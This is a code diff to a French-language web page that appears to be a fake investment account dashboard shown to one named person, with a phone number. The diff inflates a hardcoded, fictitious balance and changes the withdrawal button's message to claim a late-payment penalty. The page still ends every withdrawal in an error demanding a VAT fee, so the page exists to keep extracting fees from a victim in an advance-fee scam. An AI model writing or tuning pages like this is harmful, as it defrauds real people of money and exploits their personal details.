@@ -245,7 +245,7 @@
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde:  5 500 000 FCFA</span>
+                <span class="balance">Solde:  5 923 500 FCFA</span>
                 <div class="account-info">
                     <span id="user-name">ADOM AKLESSO</span><br>
                     <span id="user-phone">228 90 29 86 29</span>
@@ -312,7 +312,7 @@
             const setWithdrawalInfo = (method) => {
                 const accountName = "ADOM AKLESSO";
                 const accountNumber = "228 90 29 86 29";
-                const balance = "5 500 000 FCFA";
+                const balance = "5 923 500 FCFA";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
@@ -332,7 +332,7 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher ADOM, veuillez payer les frais de carte d\'investisseur afin de recevoir vos bénéfices dans les 5 minutes.');
+                alert('Cher ADOM, une pénalité a été appliquée à votre solde en raison du retard de paiement. Veuillez la régler pour finaliser votre retrait, qui est en cours de traitement.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
                 errorMessage.textContent = 'Erreur : Frais de tva néccéssaire.';
